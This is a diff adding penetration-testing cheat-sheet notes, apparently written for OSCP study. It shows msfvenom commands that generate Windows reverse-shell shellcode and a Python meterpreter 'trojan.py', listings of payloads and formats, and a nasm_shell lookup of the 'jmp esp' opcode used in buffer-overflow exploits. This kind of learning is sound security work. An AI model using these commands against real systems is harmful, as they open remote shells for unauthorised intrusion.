@@ -1,0 +1,55 @@
+TOOLS
+Tools
+
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.142.143 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d"
+
+=======================================
+LISTING PAYLOAD FORMATS
+
+root@KK:~/Documents/OSCP# msfvenom --help-formats
+Executable formats
+	asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
+Transform formats
+	bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
+root@KK:~/Documents/OSCP# 
+
+========================================
+LISTING PAYLOADS
+
+root@KKK:/ftphome# msfvenom -l payloads | more
+
+Framework Payloads (539 total) [--payload <value>]
+==================================================
+
+	Name                                                Description
+	----                                                -----------
+	aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
+	aix/ppc/shell_find_port                             Spawn a shell on an established connection
+	aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
+	aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+	android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
+	android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
+	android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
+	android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
+	
+
+Python Reverse Shell to be executed on the remote box
+
+=========================================
+msfvenom -p python/meterpreter/reverse_tcp LHOST=<local IP> LPORT=<port> > trojan.py
+
+
+
+======================================================================
+GETTING OPS CODE
+
+root@KKK:~/Documents/System# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
+nasm > 
+
+nasm > jmp esp
+00000000  FFE4              jmp esp
+nasm > 
+
+
